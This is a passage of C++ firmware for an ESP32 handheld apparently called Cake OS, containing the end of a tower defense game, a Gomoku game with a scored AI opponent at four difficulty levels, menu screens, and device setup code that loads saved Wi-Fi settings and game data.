              if (tdBullets[i].explosive) { tdSpawnExplosion(ex, ey); tdSpawnParticles(ex, ey, TFT_ORANGE, 4); }
              else { tdSpawnParticles(ex, ey, TFT_YELLOW, 2); }
              if (kill) { uint8_t deadType = tdEnemies[j].type; tdEnemies[j].active = false; tdGold += tdEnemies[j].reward; tdRemaining--; tdSpawnParticles(ex, ey, tdEnemyColor(deadType), 8); }
              if (tdBullets[i].pierce > 0) tdBullets[i].pierce--;
              else { tdBullets[i].active = false; hit = true; break; }
            }
          }
        }
      }
      for (int i = 0; i < TD_MAX_EXPLOS; i++) { if (!tdExplosions[i].active) continue; tdExplosions[i].age++; if (tdExplosions[i].age > 8) tdExplosions[i].active = false; }
      for (int i = 0; i < TD_MAX_PARTS; i++) { if (!tdParticles[i].active) continue; tdParticles[i].x += tdParticles[i].vx; tdParticles[i].y += tdParticles[i].vy; tdParticles[i].vy += 1; tdParticles[i].life -= 20; if (tdParticles[i].life <= 0) tdParticles[i].active = false; }
      tdCanvas.fillSprite(TFT_BLACK);
      tdDrawGrass(); tdDrawPath();
      for (int i = 0; i < TD_MAX_TOWERS; i++) {
        int cx = i * 40 + 20, cy = TD_TOWER_ROW1;
        if (tdTowers[i].active) tdDrawTowerSprite(cx, cy, tdTowers[i].type, tdTowers[i].flashFrames, tdTowers[i].angle, tdTowers[i].recoil);
        else { tdCanvas.drawRect(cx - 5, cy - 4, 10, 10, 0x4208); tdCanvas.drawPixel(cx - 3, cy - 2, 0x4208); tdCanvas.drawPixel(cx + 3, cy + 2, 0x4208); }
      }
      { int cx = tdCursor * 40 + 20; int cy = TD_TOWER_ROW1; tdCanvas.drawRect(cx - 8, cy - 9, 16, 17, TFT_YELLOW); }
      for (int i = 0; i < TD_MAX_ENEMIES; i++) { if (!tdEnemies[i].active) continue; int hpR = tdEnemies[i].hp * 100 / tdEnemies[i].maxHp; int ex = (int)tdEnemies[i].x; int ey = (tdEnemies[i].type == TD_FLY) ? TD_FLY_Y : TD_PATH_Y; tdDrawEnemySprite(ex, ey, tdEnemies[i].type, hpR, tdEnemies[i].walkFrame, tdEnemies[i].hitFlash); }
      for (int i = 0; i < TD_MAX_BULLETS; i++) if (tdBullets[i].active) tdDrawBulletSprite(tdBullets[i].x, tdBullets[i].y, tdBullets[i].type);
      for (int i = 0; i < TD_MAX_EXPLOS; i++) if (tdExplosions[i].active) tdDrawExplosionSprite(tdExplosions[i].x, tdExplosions[i].y, tdExplosions[i].age);
      for (int i = 0; i < TD_MAX_PARTS; i++) if (tdParticles[i].active) tdCanvas.drawPixel(tdParticles[i].x, tdParticles[i].y, tdParticles[i].color);
      tdDrawHUD(); tdCanvas.pushSprite(0, 0);
      char k = tdGetKey();
      if (k == 'E') { if (tdLevel > tdData.bestLevel) tdData.bestLevel = tdLevel; tdSave(); gameReward(tdLevel / 2); pet2TaskAdd(6, 1); tdCanvas.deleteSprite(); tdResetAll(); return; }
      else if (k == 'U') tdCursor = (tdCursor + 3) % 4;
      else if (k == 'D') tdCursor = (tdCursor + 1) % 4;
      else if (k == 'L') tdShowBuyMenu();
      else if (k == 'R') { if (tdTowers[tdCursor].active) tdShowUpgradeMenu(); }
      if (tdRemaining <= 0) levelClear = true;
    }
    for (int i = 0; i < TD_MAX_ENEMIES; i++) tdEnemies[i].active = false;
    for (int i = 0; i < TD_MAX_BULLETS; i++) tdBullets[i].active = false;
    for (int i = 0; i < TD_MAX_EXPLOS; i++) tdExplosions[i].active = false;
    for (int i = 0; i < TD_MAX_PARTS; i++) tdParticles[i].active = false;
    int bonus = tdLevelBonus(tdLevel); tdGold += bonus;
    unsigned long t0 = millis();
    while (millis() - t0 < 2000) {
      int age = millis() - t0;
      tdCanvas.fillSprite(TFT_BLACK);
      for (int i = 0; i < 80; i++) if (age > i * 6) tdCanvas.drawFastHLine(0, i, 160, 0x0210);
      tdCanvas.setTextColor(TFT_GREEN, TFT_BLACK); tdCanvas.drawCentreString("LEVEL", 80, 10, 2);
      char buf[20]; snprintf(buf, sizeof(buf), "%d CLEAR", tdLevel); tdCanvas.drawCentreString(buf, 80, 34, 2);
      tdCanvas.setTextColor(TFT_YELLOW, TFT_BLACK); snprintf(buf, sizeof(buf), "+%d", bonus); tdCanvas.drawCentreString(buf, 80, 58, 2);
      tdCanvas.pushSprite(0, 0);
      char k = tdGetKey();
      if (k == 'E') { if (tdLevel > tdData.bestLevel) tdData.bestLevel = tdLevel; tdSave(); tdCanvas.deleteSprite(); tdResetAll(); return; }
      delay(50);
    }
    tdLevel++;
  }
}
void tdShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Level:", 4, 24);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(tdData.bestLevel), 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Mode: Endless", 4, 56);
  waitExit();
}
void showTowerDef() {
  deinitWifi(); deinitBLE();
  tdLoad(); tdResetAll();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Tower Defense", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("L:build R:upgrade", 2, 60);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2;
    else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') { if (menuSel == 0) tdGamePlay(); else if (menuSel == 1) tdShowRecords(); tdLoad(); }
    else if (k == 'R' || k == 'E') { tdResetAll(); inMenu = false; }
    delay(30);
  }
  tdResetAll();
}

// ==================================================
// ============== Gomoku ==============
// ==================================================
#define GM_SIZE 11
#define GM_CELL 6
#define GM_OX 47
#define GM_OY 3
#define GM_BG 0xDE60
#define GM_LINE 0x4208
int gmBoard[GM_SIZE][GM_SIZE];
int gmCursorX, gmCursorY;
int gmDifficulty = 1;
bool gmCheckWin(int x, int y, int player) {
  int dx[4] = {1,0,1,1}, dy[4] = {0,1,1,-1};
  for (int d = 0; d < 4; d++) {
    int cnt = 1;
    for (int s = 1; s < 5; s++) { int nx=x+dx[d]*s, ny=y+dy[d]*s; if (nx<0||nx>=GM_SIZE||ny<0||ny>=GM_SIZE||gmBoard[ny][nx]!=player) break; cnt++; }
    for (int s = 1; s < 5; s++) { int nx=x-dx[d]*s, ny=y-dy[d]*s; if (nx<0||nx>=GM_SIZE||ny<0||ny>=GM_SIZE||gmBoard[ny][nx]!=player) break; cnt++; }
    if (cnt >= 5) return true;
  }
  return false;
}
bool gmIsDraw() { for (int y = 0; y < GM_SIZE; y++) for (int x = 0; x < GM_SIZE; x++) if (gmBoard[y][x] == 0) return false; return true; }
void gmDraw() {
  tft.fillScreen(GM_BG);
  int w = GM_SIZE * GM_CELL;
  tft.drawRect(GM_OX - 1, GM_OY - 1, w + 2, w + 2, GM_LINE);
  tft.drawRect(GM_OX - 2, GM_OY - 2, w + 4, w + 4, GM_LINE);
  for (int i = 0; i <= GM_SIZE; i++) { tft.drawFastHLine(GM_OX, GM_OY + i * GM_CELL, w, GM_LINE); tft.drawFastVLine(GM_OX + i * GM_CELL, GM_OY, w, GM_LINE); }
  for (int y = 0; y < GM_SIZE; y++) for (int x = 0; x < GM_SIZE; x++) {
    if (!gmBoard[y][x]) continue;
    int px = GM_OX + x * GM_CELL + GM_CELL/2; int py = GM_OY + y * GM_CELL + GM_CELL/2;
    tft.fillCircle(px, py, GM_CELL/2 - 1, gmBoard[y][x]==1 ? TFT_BLACK : TFT_WHITE);
  }
  int px = GM_OX + gmCursorX * GM_CELL; int py = GM_OY + gmCursorY * GM_CELL;
  tft.drawRect(px, py, GM_CELL, GM_CELL, TFT_RED);
  tft.setTextColor(TFT_WHITE, GM_BG); tft.drawString("Gomoku", 2, 0);
  const char* dn = (gmDifficulty==0)?"Easy":(gmDifficulty==1?"Normal":(gmDifficulty==2?"Hard":"Hell"));
  tft.drawString(dn, 125, 0);
  tft.setTextColor(TFT_DARKGREY, GM_BG); tft.drawString("HoldL:place R2x:exit", 2, 72);
}
int gmEvalDir(int x, int y, int dx, int dy, int player) {
  int chain1=0, chain2=0; bool open1=false, open2=false;
  int cx=x+dx, cy=y+dy;
  while (cx>=0&&cx<GM_SIZE&&cy>=0&&cy<GM_SIZE&&gmBoard[cy][cx]==player){chain1++;cx+=dx;cy+=dy;}
  if (cx>=0&&cx<GM_SIZE&&cy>=0&&cy<GM_SIZE&&gmBoard[cy][cx]==0) open1=true;
  cx=x-dx; cy=y-dy;
  while (cx>=0&&cx<GM_SIZE&&cy>=0&&cy<GM_SIZE&&gmBoard[cy][cx]==player){chain2++;cx-=dx;cy-=dy;}
  if (cx>=0&&cx<GM_SIZE&&cy>=0&&cy<GM_SIZE&&gmBoard[cy][cx]==0) open2=true;
  int cnt = 1 + chain1 + chain2; int openEnds = (open1?1:0) + (open2?1:0);
  if (cnt>=5) return 1000000;
  if (cnt==4){if(openEnds==2)return 100000;if(openEnds==1)return 10000;return 0;}
  if (cnt==3){if(openEnds==2)return 5000;if(openEnds==1)return 500;return 0;}
  if (cnt==2){if(openEnds==2)return 300;if(openEnds==1)return 30;return 0;}
  if (cnt==1){if(openEnds==2)return 10;if(openEnds==1)return 1;return 0;}
  return 0;
}
int gmEvalPoint(int x, int y, int player) {
  if (gmBoard[y][x] != 0) return 0;
  static const int dx[4]={1,0,1,1}; static const int dy[4]={0,1,1,-1};
  int total = 0;
  for (int d=0;d<4;d++) total += gmEvalDir(x,y,dx[d],dy[d],player);
  return total;
}
void gmAI() {
  for (int y=0;y<GM_SIZE;y++) for (int x=0;x<GM_SIZE;x++) { if(gmBoard[y][x]!=0)continue; gmBoard[y][x]=2; bool w=gmCheckWin(x,y,2); gmBoard[y][x]=0; if(w){gmBoard[y][x]=2;return;} }
  for (int y=0;y<GM_SIZE;y++) for (int x=0;x<GM_SIZE;x++) { if(gmBoard[y][x]!=0)continue; gmBoard[y][x]=1; bool w=gmCheckWin(x,y,1); gmBoard[y][x]=0; if(w){gmBoard[y][x]=2;return;} }
  int bestX=-1,bestY=-1; long bestScore=-1;
  for (int y=0;y<GM_SIZE;y++) for (int x=0;x<GM_SIZE;x++) {
    if (gmBoard[y][x]!=0) continue;
    bool nearby=false;
    for (int dy=-2;dy<=2&&!nearby;dy++) for (int dx=-2;dx<=2&&!nearby;dx++){int nx=x+dx,ny=y+dy;if(nx<0||nx>=GM_SIZE||ny<0||ny>=GM_SIZE)continue;if(gmBoard[ny][nx]!=0)nearby=true;}
    if (!nearby) continue;
    int s1=gmEvalPoint(x,y,2); int s2=gmEvalPoint(x,y,1);
    long score;
    if (gmDifficulty==0) score = s1/4 + s2/4 + random(4000);
    else if (gmDifficulty==1) score = s1 + s2*11/10 + random(50);
    else if (gmDifficulty==2) score = s1*12/10 + s2*11/10;
    else {
      score = s1*13/10 + s2*12/10;
      gmBoard[y][x] = 2;
      bool oppWinNext = false;
      for (int yy=0;yy<GM_SIZE&&!oppWinNext;yy++) for (int xx=0;xx<GM_SIZE&&!oppWinNext;xx++) {
        if (gmBoard[yy][xx]!=0) continue;
        gmBoard[yy][xx]=1; bool w=gmCheckWin(xx,yy,1); gmBoard[yy][xx]=0;
        if (w) oppWinNext = true;
      }
      gmBoard[y][x] = 0;
      if (oppWinNext) score -= 50000;
    }
    if (score>bestScore){bestScore=score;bestX=x;bestY=y;}
  }
  if (bestX<0){ if(gmBoard[GM_SIZE/2][GM_SIZE/2]==0){gmBoard[GM_SIZE/2][GM_SIZE/2]=2;return;} for(int y=0;y<GM_SIZE;y++)for(int x=0;x<GM_SIZE;x++)if(gmBoard[y][x]==0){gmBoard[y][x]=2;return;} }
  gmBoard[bestY][bestX]=2;
}
// ★ 五子棋双击窗口 300ms
char gmGetKey() {
  static bool lHeld=false; static unsigned long lStart=0; static bool lLongFired=false;
  static unsigned long lastRight=0;
  const unsigned long DBL = 300;

  if (digitalRead(BTN_UP)==LOW){delay(20);if(digitalRead(BTN_UP)==LOW){while(digitalRead(BTN_UP)==LOW)delay(5);return 'l';}}
  if (digitalRead(BTN_DOWN)==LOW){delay(20);if(digitalRead(BTN_DOWN)==LOW){while(digitalRead(BTN_DOWN)==LOW)delay(5);return 'r';}}

  bool lNow = (digitalRead(BTN_LEFT)==LOW);
  if (lNow && !lHeld) { delay(20); if (digitalRead(BTN_LEFT)==LOW) { lHeld=true; lStart=millis(); lLongFired=false; } }
  else if (!lNow && lHeld) { lHeld=false; if (!lLongFired) return 'U'; }
  else if (lNow && lHeld && !lLongFired && (millis()-lStart)>=500) { lLongFired=true; return 'P'; }

  bool rNow = (digitalRead(BTN_RIGHT)==LOW);
  if (rNow) {
    delay(20);
    if (digitalRead(BTN_RIGHT)==LOW) {
      while (digitalRead(BTN_RIGHT)==LOW) delay(5);
      unsigned long now=millis();
      if (lastRight>0 && now-lastRight<DBL) { lastRight=0; return 'E'; }
      lastRight=now;
      return 'D';
    }
  }
  return 0;
}
void gmGamePlay() {
  memset(gmBoard, 0, sizeof(gmBoard));
  gmCursorX = GM_SIZE/2; gmCursorY = GM_SIZE/2;
  gmDraw();
  bool playerTurn = true;
  while (true) {
    char k = gmGetKey();
    if (k=='E') { pet2TaskAdd(6,1); return; }
    if (playerTurn) {
      if (k=='U') { gmCursorY--; if (gmCursorY<0) gmCursorY=0; }
      else if (k=='D') { gmCursorY++; if (gmCursorY>=GM_SIZE) gmCursorY=GM_SIZE-1; }
      else if (k=='l') { gmCursorX--; if (gmCursorX<0) gmCursorX=0; }
      else if (k=='r') { gmCursorX++; if (gmCursorX>=GM_SIZE) gmCursorX=GM_SIZE-1; }
      else if (k=='P') {
        if (!gmBoard[gmCursorY][gmCursorX]) {
          gmBoard[gmCursorY][gmCursorX] = 1;
          if (gmCheckWin(gmCursorX, gmCursorY, 1)) {
            gmData.wins++; gmSave(); gameReward(15); pet2TaskAdd(6,1);
            gmDraw(); tft.setTextColor(TFT_RED, GM_BG); tft.drawCentreString("YOU WIN!", 80, 40, 1); waitExit(); return;
          }
          if (gmIsDraw()) { gmSave(); gameReward(8); pet2TaskAdd(6,1); gmDraw(); tft.setTextColor(TFT_YELLOW, GM_BG); tft.drawCentreString("DRAW", 80, 40, 1); waitExit(); return; }
          playerTurn = false;
        }
      }
      gmDraw();
    } else {
      delay(300);
      gmAI();
      for (int y=0;y<GM_SIZE;y++) for (int x=0;x<GM_SIZE;x++)
        if (gmBoard[y][x]==2 && gmCheckWin(x,y,2)) {
          gmData.losses++; gmSave(); gameReward(5); pet2TaskAdd(6,1);
          gmDraw(); tft.setTextColor(TFT_RED, GM_BG); tft.drawCentreString("AI WINS", 80, 40, 1); waitExit(); return;
        }
      if (gmIsDraw()) { gmSave(); gameReward(8); pet2TaskAdd(6,1); gmDraw(); tft.setTextColor(TFT_YELLOW, GM_BG); tft.drawCentreString("DRAW", 80, 40, 1); waitExit(); return; }
      playerTurn = true;
      gmDraw();
    }
    delay(40);
  }
}
void gmShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Wins  : " + String(gmData.wins), 4, 30);
  tft.drawString("Losses: " + String(gmData.losses), 4, 44);
  waitExit();
}
void showGomoku() {
  deinitWifi(); deinitBLE(); gmLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Gomoku", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$"+String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[]={"Start","Records"};
    for (int i=0;i<2;i++) tft.drawString(((i==menuSel)?"> ":"  ")+String(items[i]),2,20+i*14);
    tft.setTextColor(TFT_DARKGREY,TFT_BLACK); tft.drawString("HoldL:place  R2x:exit",2,60);
    char k=getKey();
    if (k=='U') menuSel=(menuSel+1)%2;
    else if (k=='D') menuSel=(menuSel+1)%2;
    else if (k=='L') {
      if (menuSel==0) {
        int d=1; bool chosen=false;
        while (!chosen) {
          clearAll();
          tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawCentreString("Choose Difficulty",80,6,1);
          const char* diff[4]={"Easy","Normal","Hard","Hell"};
          for (int i=0;i<4;i++){tft.setTextColor(i==d?TFT_YELLOW:TFT_WHITE,TFT_BLACK);tft.drawString(((i==d)?"> ":"  ")+String(diff[i]),2,22+i*12);}
          tft.setTextColor(TFT_DARKGREY,TFT_BLACK); tft.drawString("L:ok  R/E:back",2,74);
          char kk=getKey();
          if (kk=='U') d=(d+3)%4; else if (kk=='D') d=(d+1)%4;
          else if (kk=='L') { gmDifficulty=d; chosen=true; }
          else if (kk=='R'||kk=='E') { chosen=true; d=-1; }
          delay(30);
        }
        if (d>=0) gmGamePlay();
      } else gmShowRecords();
      gmLoad();
    } else if (k=='R'||k=='E') inMenu=false;
    delay(30);
  }
}

// ==================== setup / loop ====================
void setup() {
  Serial.begin(115200);
  setCpuFrequencyMhz(160);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  EEPROM.begin(1024);
  g_kbLayout = EEPROM.read(720);
  if (g_kbLayout > 1) g_kbLayout = 0;
  gameKeyMapLoad();
  wifiCacheLoad();
  wifiIpCacheLoad();
  WifiCred wc;
  EEPROM.get(WC_EEPROM_ADDR, wc);
  if (wc.magic == WC_MAGIC && strlen(wc.ssid) > 0) {
    strncpy(g_wifiSSID, wc.ssid, 32); g_wifiSSID[32] = 0;
    strncpy(g_wifiPass, wc.pass, 64); g_wifiPass[64] = 0;
    wifiConfigured = true;
  } else if (strlen(WIFI_SSID) > 0 && strcmp(WIFI_SSID, "WiFi名") != 0) {
    strncpy(g_wifiSSID, WIFI_SSID, 32); g_wifiSSID[32] = 0;
    strncpy(g_wifiPass, WIFI_PASSWORD, 64); g_wifiPass[64] = 0;
    wifiConfigured = true;
  }
  if (wifiConfigured) wifiInitFast();
  tft.init();
  tft.setRotation(3);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Cake OS", 50, 20);
  tft.drawString("v5.3", 65, 35);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawCentreString("Loading...", 80, 55, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  pet2Load();
  keyLoad();
  dinoLoad(); tetLoad(); brkLoad();
  flpLoad(); g2Load(); plnLoad(); minLoad(); rogLoad();
  jmpLoad(); tdLoad(); snkLoad(); gmLoad();
  randomSeed(esp_random());
  delay(300);
  clearAll();
}
void loop() {
  showPetWhale();
}